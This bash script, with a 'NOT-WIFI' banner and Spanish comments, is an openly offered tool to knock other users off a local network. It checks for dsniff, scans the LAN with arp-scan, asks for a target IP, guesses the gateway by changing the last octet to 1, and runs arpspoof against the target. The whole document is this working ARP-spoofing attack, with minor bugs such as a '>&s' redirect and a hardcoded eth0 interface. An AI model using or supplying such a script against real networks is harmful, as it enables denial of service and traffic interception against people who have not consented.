#!/bin/bash
echo -e "\e[32m
███╗   ██╗ ██████╗ ████████╗   ██╗    ██╗██╗███████╗██╗
████╗  ██║██╔═══██╗╚══██╔══╝   ██║    ██║██║██╔════╝██║
██╔██╗ ██║██║   ██║   ██║█████╗██║ █╗ ██║██║█████╗  ██║
██║╚██╗██║██║   ██║   ██║╚════╝██║███╗██║██║██╔══╝  ██║
██║ ╚████║╚██████╔╝   ██║      ╚███╔███╔╝██║██║     ██║
╚═╝  ╚═══╝ ╚═════╝    ╚═╝       ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝
--> Disable Wi-Fi from users connected in my network
By Imoberdorf Martin
\e[0m"


#Verifica si esta instalada la herramienta - 0 se ejecuto bien - 1 no esta instalada
check_herramienta(){
    if ! [ -x "$(command -v $1)" ];then
        echo "Error: $1 no esta instalado. Por favor, instala $1 y vuelve a intentarlo." >&s
        exit 1
    fi
}

check_herramienta "dsniff"
read -p "Inserte la interfaz de red que quieras analizar: " interfaz
echo
result=$(arp-scan -I eth0 --localnet)
sorted_result=$(echo "$result" | sort | head -n -4)
echo "------------------- Dipositivos encontrados -------------------"
echo "$sorted_result"
echo
read -p "Inserte la IP  objetivo: " ip

#cambiamos el ultimo digito por 1 mediante expresiones regulares
puerta_enlace=$(echo $ip | sed 's/\([0-9]\+\)$/1/g')

arpspoof -i "$interfaz" -t "$ip" "$puerta_enlace"